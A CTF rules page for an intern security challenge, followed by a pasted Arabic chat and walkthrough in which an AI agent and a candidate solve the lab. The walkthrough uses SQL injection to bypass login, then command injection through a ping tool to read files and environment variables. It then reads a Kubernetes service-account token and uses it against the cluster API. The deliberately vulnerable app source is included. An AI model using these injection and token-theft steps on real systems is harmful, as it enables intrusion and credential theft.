# Thndr Security CTF

Read this page in full before you begin.

## What this is

There are **five hidden flags** in an environment provisioned just for you. Each flag is a signed JWT — copy the full token string and paste it into your final report.

The flags increase in difficulty and tell one continuous story. You're not expected to find all five — a partial result with a thoughtful writeup is a strong submission.

## ⚠ Do not share your answers

**Intern spots are limited and competitive.** Sharing your solution or flag tokens with other candidates only hurts your own chances.

Tokens are per-candidate signed — the panel sees if the same solution appears in multiple reports.

## Time limit

**36 hours** from the moment your environment was provisioned (this is the timestamp on the invite email you received). The flag tokens expire at that instant — late submissions verify as expired and won't count.

The 36 hours are wall-clock, not active time. Sleep, eat, take breaks. Burnout is not the test.

## What to submit

1. The flag JWT strings you obtained (one per line, prefixed `f1=` through `f5=`).
2. A **short written report** (markdown, ~1–3 pages) covering, per flag:
    - How you discovered the path
    - What dead-ends or wrong turns you took
    - If you were defending this environment, what would you fix?

The report carries equal weight to the flags. A clean writeup with three flags beats five flags with no explanation.

Email your flags and report to [**security@thndr.app**](mailto:security@thndr.app) before your 36-hour window expires.

## Rules

### DO these are encouraged

- Use the public internet, documentation, search engines, and AI tools (ChatGPT, Claude, Copilot) however you like.
- Read code, read configs, explore the environment by hand.
- Take notes as you go — you'll need them for the report.

### DON'T these are out of scope

- Don't attack other candidates' environments. Multiple candidates are active at the same time.
- Don't attack Cloudflare, the reverse proxy, the underlying infrastructure, or the host machines — only the lab targets are in scope.
- Don't run automated vulnerability scanners or automated exploitation frameworks (Burp Pro active scan, sqlmap, nuclei, metasploit auto-pwn, etc.). Manual use of utilities is fine.
- No fuzzing, brute-forcing, password cracking, or wordlist attacks. Every flag has a clean, deterministic path — if you're firing off thousands of requests, you're on the wrong one.
- No kernel-level exploits. The intended paths don't require them.
- Don't denial-of-service the environment (no fork bombs, no resource exhaustion). You have a quota; respect it.
- Don't share the flag JWTs or your solution with other candidates. Tokens are per-candidate-signed; sharing is detectable.
- Don't submit anyone else's work as your own.

## What we observe

Everything you do inside the lab is logged. The panel reviews your activity as part of grading the report — so be honest about what you actually did.

## Your environment

- Clicking **Begin challenge** sends you through a Cloudflare Access one-time PIN. That step is just identity — it's how we isolate your environment by email.
- **Right after the OTP you'll see a login page. That login page is the start of the CTF.** Don't email asking for credentials — figuring it out is part of the challenge.
- The environment is fully reset on request — email us if you wedge something irrecoverably.
-  
- -------
بعد ما رفعت اللينك لمانوس جبلي اول فلاجين وعايزك تفتح وتكمل من بعده .. دي المحادثة واللي عمله ... 

أنا جاهز تماماً. يرجى إخباري بمجرد انتهائك من تسجيل الدخول والوصول إلى الصفحة الرئيسية للتحدي، وسأقوم فوراً ببدء عملية البحث عن الثغرات والأعلام.

انه يحمي الصفحة ب cloudefare [https://play.thndr-ctf.app/login](https://play.thndr-ctf.app/login)

Lite

فهمت قصدك. لكي أتمكن من متابعة التحدي، يجب أن يتم تسجيل الدخول داخل المتصفح الخاص بي هنا.

من فضلك، استخدم خاصية **"Take over browser"** (التي ستظهر لك كخيار في رسالتي التالية) لتقوم بإدخال بريدك الإلكتروني ورمز التحقق مباشرة في نافذة المتصفح التي أراها. بهذه الطريقة، سيتم حفظ "الكوكيز" وجلسة العمل عندي، وسأتمكن من إكمال التحدي بدلاً منك.

Lite

22:25

من فضلك، اضغط على زر التحكم بالمتصفح أدناه وقم بتسجيل الدخول ببريدك الإلكتروني ورمز التحقق. بمجرد دخولك لصفحة التحدي، سأتمكن من رؤيتها ومتابعة العمل.

ابدا الان واستخرج الفلاجات ولكن مع العرص على ان لا تكسر التعليمات 

- I confirmed successful login to the challenge environment. Next, I'll analyze the app for vulnerabilities and locate hidden flags.

I analyzed the login page for clues; no hidden comments or hints found. The /healthz endpoint returns straightforward "ok"; next, will explore for vulnerabilities.

Found no robots.txt restrictions; attempted default credentials failed. Next, will analyze login behavior for vulnerabilities or clues.

I found no sensitive files or obvious entry points; explored the main page and static directory. Next, I'll test login behavior for vulnerabilities.

I confirmed the session token and stored Flag 1 details. Attempted SQL injection to evaluate login vulnerability; further testing of command injection was hindered by DOM changes. Will continue exploring attack vectors.

I confirmed session token details and attempted command injection with "127.0.0.1; ls -la," which successfully listed server files, indicating command injection vulnerability. Next, I'll explore further attack vectors.

Found the dashboard and session token; I’ll explore further attack vectors now, considering the command injection vulnerability and the confidential token for potential privilege escalation.

I confirmed command injection allows viewing flags; flag2 retrieved from token and app.py. Next, I’ll analyze app.py for additional vulnerabilities and flags.

The app has SQL injection in login and command injection in `/diag`. Exploiting these can reveal Flag 1 and Flag 2; next, I’ll further investigate vulnerabilities.

I confirmed command injection via `/diag` with Python and wget, enabling me to access internal resources. Next, I'll explore other endpoints for further vulnerabilities.

I confirmed command injection via `/diag` endpoint, successfully accessing internal resources. Next goal: perform directory traversal and explore for additional services or files

## Flag 1

- **Token**: `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjEiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiOGJlYWQ1YzktN2Q2Mi00OTFhLWJkOWItYmVjZDI3ZWFjMWU4In0.4BlQcPKpb1d7xonek7uVzhTxhp9Juw8Vrug_2y1_iRAJzVKOki-afAX_WjHtDYApyBxASa7JmHiyDN1uYnhWDg`

- **Discovery Path**:

    1. Accessed the login page at `https://play.thndr-ctf.app/`.

    2. Tested for basic SQL injection in the `username` field using `' OR 1=1 --`.

    3. Successfully bypassed the login and was redirected to `/dashboard`.

    4. Flag 1 was displayed as the "Operator token" on the dashboard.

- **Defensive Fix**: Use parameterized queries or an ORM to prevent SQL injection. Implement proper input validation and sanitization.

  

---
## Flag 2

- **Token**: `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjIiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiZmQ5YjdmYTQtYmY0OS00OTY5LWExNzAtNWQ5OWQ5YWNmYjA3In0.EtLbs3i7wxP3VDNXPWcHbu_JoxUcQzyJJNpk7g_DuMU3LPkQ4iit-buRCwF6gPPs9Ozjcsx1HFW8lkZdzp30Bg`

- **Discovery Path**:

    1. Identified a "Connectivity diagnostics" tool on the dashboard that performs a `ping`.

    2. Tested for command injection by appending `; ls -la` to the input.

    3. The command executed successfully, revealing a file named `flag2.jwt` in the current directory.

    4. Used `127.0.0.1; cat flag2.jwt` to read the file content.

- **Defensive Fix**: Avoid using shell commands directly. If necessary, use a well-defined API or library for the specific task (e.g., a native ping library) and strictly validate/sanitize all user inputs. Use a whitelist of allowed characters.

الأوامر التي تم تنفيذها (عبر ثغرة Command Injection في /diag):
127.0.0.1; find / -name "*flag*" 2>/dev/null: للبحث عن أي ملفات تحتوي على كلمة "flag".
127.0.0.1; cat /app/app.py: لقراءة كود التطبيق وفهم المنطق البرمجي.
127.0.0.1; env: لعرض متغيرات البيئة، ووجدنا فيها Flag 1.
127.0.0.1; cat /app/flag2.jwt: لقراءة العلم الثاني (تم تأكيد وجوده في ملف).
127.0.0.1; curl -s http://172.20.82.56/: محاولة الوصول إلى الخدمة الداخلية الأخرى (Pod B ).
المعلومات المهمة المكتشفة:
Flag 1: موجود في متغير البيئة FLAG1 ويظهر في لوحة التحكم كـ "Operator token".
Flag 2: موجود في ملف /app/flag2.jwt.
البنية التحتية: التطبيق يعمل داخل Kubernetes، وهناك "Pod B" بعنوان IP داخلي 172.20.82.56.
ثغرة SQL Injection: تم استخدام ' OR 1=1 -- لتجاوز تسجيل الدخول.
ثغرة Command Injection: موجودة في أداة ping في المسار /diag.
سأكمل الآن بمحاولة استكشاف Pod B والخدمات الداخلية الأخرى للوصول إلى Flag 3. سأحتاج للتأكد من أنني لا أزال مسجلاً للدخول.


ده 
127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/..2026_05_24_20_28_49.3475249118/token
 ping
Output
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
eyJhbGciOiJSUzI1NiIsImtpZCI6IjU1YmNmOGVmOThhMjUyNzhlZmIyMzEyYjY0MDg4NjFhNzA3NWFiMTUiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc3OTc0MDkyOSwiaWF0IjoxNzc5NjU0NTI5LCJpc3MiOiJodHRwczovL29pZGMuZWtzLmV1LWNlbnRyYWwtMS5hbWF6b25hd3MuY29tL2lkLzI1RjVBODRDOUNCNkE2QjZFMzE1MTMxMUQyRTU3OEREIiwianRpIjoiOGFjOGU3MzktOTcyNi00Y2JiLWJkMWItMDUzZGM4YzAxNWJjIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjLXd3dzFhYm9yYXNoYWQtZ21haWwtY29tIiwibm9kZSI6eyJuYW1lIjoiaS0wMDU5MDg0NWViY2FkOWE2NiIsInVpZCI6Ijg4ZTIyZjNiLTlkYjMtNGJkOC05NmUxLTNhOWJhZTYzZTAzYiJ9LCJwb2QiOnsibmFtZSI6InBvZC1hLTdkZjU5OWRiOTYtbjU3dzciLCJ1aWQiOiI0YzdiOWU5YS0yYmEzLTRiNzYtYjlmZS01NDQxMTg3MmE3NzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InBvZC1hLXNhIiwidWlkIjoiYjM4ZjQ2NGYtYTllNi00MzBiLThkODAtMzE5OTkxZDNlMDM1In0sIndhcm5hZnRlciI6MTc3OTY1ODEzNn0sIm5iZiI6MTc3OTY1NDUyOSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmMtd3d3MWFib3Jhc2hhZC1nbWFpbC1jb206cG9kLWEtc2EifQ.fSfShI1SdcV9zVizsyIFLXuEPZ94w-LN7kVNRjFoLjqAqcJ9Nb45iwvWI3R20UolWO8SAQivRXwoAx9v8Jr2osiPjwdZchLxkw_hLnuta81TUqtaqpe19R8Wv-iQ8vAZqvi5kSgt1nT2HrMVBpmPktZAPn2bCEvFYuWdvmSS-A1nRfcfP7sX5DzvTVqmVMeUjWJ4xtJP7B4dDue4MV4P_gwmXxbpcip_8kwGxOAty22uq4XNEl8x6A7uW5NZIcHhil6xF1kP-eJGXIemx_rrGZbxoukShkfge9Hxntn6yw_gNKd8o2rpr_z_LrTuQK0aVtyPlnn_JT6l7v0EtvF5vQ




127.0.0.1; cat /var/run/secrets/kubernetes.io/serviceaccount/..2026_05_24_20_28_49.3475249118/ca.crt
 ping
Output
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.015 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
-----BEGIN CERTIFICATE-----
MIIDBTCCAe2gAwIBAgIIBWV4FrUTxbswDQYJKoZIhvcNAQELBQAwFTETMBEGA1UE
AxMKa3ViZXJuZXRlczAeFw0yNjA0MjgwOTU1NTNaFw0zNjA0MjUxMDAwNTNaMBUx
EzARBgNVBAMTCmt1YmVybmV0ZXMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
AoIBAQC5JPakmql0FUOJ+vRisbzSdH2dJgOQOhWseMNZN1VtczBYBSBl4Xrt/spb
39vRC0nW+U3AqcP83gdHPN3q1GV4uhZ6sLC35ASj7gEAtLegiW+rGKwN0OxA2qlt
faEPy5vzVJfHfSVTpCzZnbhBeg74I+Rjx9l16SwHoVXj3QmfHs7rUirxBsP7ya66
W6PZjXbsHO31AjpEdrHdDl0gJVW+k05XpgqhAIrp6k/eMI3UMqH2Ek7exw/vYRM8
6R5pGHioNAK+v0zf0PLG5kmhmErLFRyDgkHiDzsdyhfZI36bQbH4DdZbvRKs/T3b
bSZKGow/1K3wshmMPDqlTbL1u6fBAgMBAAGjWTBXMA4GA1UdDwEB/wQEAwICpDAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBSD7YgXbaMVn8y3x56QfN71ei5KnTAV
BgNVHREEDjAMggprdWJlcm5ldGVzMA0GCSqGSIb3DQEBCwUAA4IBAQCtuh2ThSxO
q9LjEOBha9z9SVBASlaV7oip7S5wPcZsGf2LxsxzyO0ms4vVFoWzyDbVnN1AopQf
Q2PzMfw3JdMVFsqbuMWauvLr6cJa6vDgSWQPo1PmCE+B2Xo++PfCfR+hDHAPJauK
h8yqZCglVAFkEKmz+mIn+WzuAeIelrxyqb8GcZ38S33M4szqlNvkKNoxlWFPvsFu
2Us166uCUW14XgWweMFwLSWIo7pHWPqhy0aqiZO7PodbpDsIDMAedYUl/5Fs345Z
aZTrzNe3Pq4dUi+9x9KPiRA1vLo8E2qua9iG/bXHikAz08iOmdg8iHsGsPPBNOV5
D7LHsjY3ftL0
-----END CERTIFICATE-----

127.0.0.1; TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/..2026_05_24_20_28_49.3475249118/token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api 


.

 ping

#### Output

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
{"kind":"APIVersions","versions":["v1"],"serverAddressByClientCIDRs":[{"clientCIDR":"0.0.0.0/0","serverAddress":"ip-172-16-41-171.eu-central-1.compute.internal:443"}]}



----
---
signed in as `admin` · [log out](https://play.thndr-ctf.app/logout)

# Operator Dashboard

**Session welcome.** Operator token issued: `eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJjdGYudGhuZHItaW50ZXJuYWwuYXBwIiwic3ViIjoid3d3MWFib3Jhc2hhZEBnbWFpbC5jb20iLCJmbGFnIjoiZjEiLCJpYXQiOjE3Nzk2MzEwOTYsImV4cCI6MTc3OTc2MDY5NiwianRpIjoiOGJlYWQ1YzktN2Q2Mi00OTFhLWJkOWItYmVjZDI3ZWFjMWU4In0.4BlQcPKpb1d7xonek7uVzhTxhp9Juw8Vrug_2y1_iRAJzVKOki-afAX_WjHtDYApyBxASa7JmHiyDN1uYnhWDg`

Treat this string as confidential. Copy it for your records.

### Service status

- API gateway: OK
- Order book: OK
- Settlement: degraded

### Connectivity diagnostics

Quick reachability check against an internal host.

 ping

#### Output

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.012 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.012/0.012/0.012/0.000 ms
"""Pod-A: 'Thndr Internal — Operator Console'.

Flag 1: SQL injection in the login form (string-concat'd password check).
Flag 2: command injection in the /diag tool inside the post-login dashboard.

Intentionally insecure — do not 'fix' the bugs.
"""
import os
import secrets
import sqlite3
import subprocess

from flask import Flask, request, redirect, render_template_string, session, url_for

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)  # ephemeral; new on each pod start.

FLAG1 = os.environ.get("FLAG1", "missing-flag1")
EMAIL = os.environ.get("CANDIDATE_EMAIL", "unknown")

# In-memory user store. There IS a real admin account; the password is random
# and not findable by guessing — the only way through is SQL injection.
ADMIN_PASS = secrets.token_hex(16)
_db = sqlite3.connect(":memory:", check_same_thread=False)
_db.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
_db.executemany(
    "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
    [
        ("admin", ADMIN_PASS, "operator"),
        ("seif",  secrets.token_hex(16), "operator"),
        ("ops",   secrets.token_hex(16), "viewer"),
    ],
)
_db.commit()


LOGIN_HTML = """<!doctype html>
<html lang=en>
<head>
  <meta charset=utf-8>
  <title>Thndr Internal — Sign In</title>
  <style>
    body { font: 14px/1.5 -apple-system, sans-serif; background:#f4f5f7; margin:0;
           display:flex; align-items:center; justify-content:center; min-height:100vh; color:#222; }
    .card { background:#fff; padding:32px 36px; border-radius:10px; width:340px;
            box-shadow:0 1px 4px rgba(0,0,0,.06); border:1px solid #e5e5e5; }
    h1 { margin:0 0 4px; font-size:18px; }
    p.small { color:#666; margin:0 0 18px; font-size:13px; }
    label { display:block; font-size:12px; color:#444; margin-top:10px; }
    input { width:100%; padding:8px 10px; border:1px solid #ccc; border-radius:6px;
            font-size:14px; margin-top:4px; }
    button { margin-top:16px; width:100%; padding:9px; background:#1a1a1a; color:#fff;
             border:0; border-radius:6px; font-weight:600; cursor:pointer; }
    .err { color:#b3261e; font-size:13px; margin-top:10px; }
    .footer { color:#888; font-size:11px; margin-top:16px; text-align:center; }
  </style>
</head>
<body>
  <form class=card method=post action="/login">
    <h1>Thndr Internal · Operator Console</h1>
    <p class=small>Restricted to authorized operators.</p>
    <label>Username
      <input name=username autocomplete=off autofocus value="{{ username|e }}">
    </label>
    <label>Password
      <input name=password type=password autocomplete=off>
    </label>
    <button type=submit>Sign in</button>
    {% if error %}<div class=err>{{ error }}</div>{% endif %}
    <div class=footer>internal-console v0.3 · <a href="/healthz">health</a></div>
  </form>
</body>
</html>
"""

DASHBOARD_HTML = """<!doctype html>
<html lang=en>
<head>
  <meta charset=utf-8>
  <title>Thndr — Operator Dashboard</title>
  <style>
    body { font: 14px/1.55 -apple-system, sans-serif; max-width:780px; margin:32px auto; color:#222; padding:0 16px; }
    h1 { margin:0 0 4px; font-size:22px; } h3 { margin-top:24px; }
    code, pre { background:#f3f3f3; padding:2px 6px; border-radius:4px; font-size:13px; }
    pre { padding:10px; white-space:pre-wrap; }
    .ok { color:#1a7f37; } .warn { color:#b85c00; }
    input[type=text] { width:70%; padding:6px 8px; }
    button { padding:6px 12px; }
    .small { color:#666; font-size:12px; }
    .banner { background:#fff8c5; border:1px solid #f0d000; padding:10px 14px; border-radius:8px;
              font-size:13px; margin-bottom:18px; }
    .who { float:right; color:#555; font-size:13px; }
  </style>
</head>
<body>
  <div class=who>signed in as <code>{{ who }}</code> · <a href="/logout">log out</a></div>
  <h1>Operator Dashboard</h1>
  <div class=banner>
    <b>Session welcome.</b> Operator token issued: <code>{{ flag1 }}</code>
    <div class=small>Treat this string as confidential. Copy it for your records.</div>
  </div>

  <h3>Service status</h3>
  <ul>
    <li>API gateway: <span class=ok>OK</span></li>
    <li>Order book: <span class=ok>OK</span></li>
    <li>Settlement: <span class=warn>degraded</span></li>
  </ul>

  <h3>Connectivity diagnostics</h3>
  <p class=small>Quick reachability check against an internal host.</p>
  <form method=get action="/diag">
    <input type=text name=host placeholder="e.g. settlement.internal" value="{{ host|e }}">
    <button>ping</button>
  </form>
  {% if output is not none %}
    <h4>Output</h4>
    <pre>{{ output }}</pre>
  {% endif %}

  <p class=small style="margin-top:48px">Build: <code>internal-console@dev-7c1a</code></p>
</body>
</html>
"""


def _logged_in():
    return bool(session.get("user"))


@app.route("/")
def index():
    if _logged_in():
        return redirect(url_for("dashboard"))
    return render_template_string(LOGIN_HTML, error=None, username="")


@app.route("/login", methods=["POST"])
def login():
    """Deliberately broken: builds SQL with string interpolation. Flag 1 path."""
    u = request.form.get("username", "")
    p = request.form.get("password", "")
    # The bug: untrusted input concatenated into the query. Do NOT 'fix'.
    q = (
        "SELECT id, username, role FROM users "
        f"WHERE username = '{u}' AND password = '{p}'"
    )
    try:
        cur = _db.execute(q)
        row = cur.fetchone()
    except sqlite3.Error as e:
        return render_template_string(
            LOGIN_HTML, error=f"query error: {e}", username=u
        )

    if not row:
        return render_template_string(
            LOGIN_HTML, error="Invalid credentials.", username=u
        )

    session["user"] = row[1]
    session["role"] = row[2]
    return redirect(url_for("dashboard"))


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/dashboard")
def dashboard():
    if not _logged_in():
        return redirect(url_for("index"))
    return render_template_string(
        DASHBOARD_HTML,
        who=session.get("user", "?"),
        flag1=FLAG1,
        host="",
        output=None,
    )


@app.route("/diag")
def diag():
    """Deliberately broken: shells out with shell=True on user input. Flag 2 path."""
    if not _logged_in():
        return redirect(url_for("index"))
    host = request.args.get("host", "").strip()
    if not host:
        return redirect(url_for("dashboard"))
    cmd = f"ping -c 1 -W 1 {host}"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=4)
        out = (r.stdout + r.stderr).strip() or "(no output)"
    except subprocess.TimeoutExpired:
        out = "timed out"
    return render_template_string(
        DASHBOARD_HTML,
        who=session.get("user", "?"),
        flag1=FLAG1,
        host=host,
        output=out,
    )


@app.route("/healthz")
def healthz():
    return "ok\n", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)

Build: `internal-console@dev-7c1a`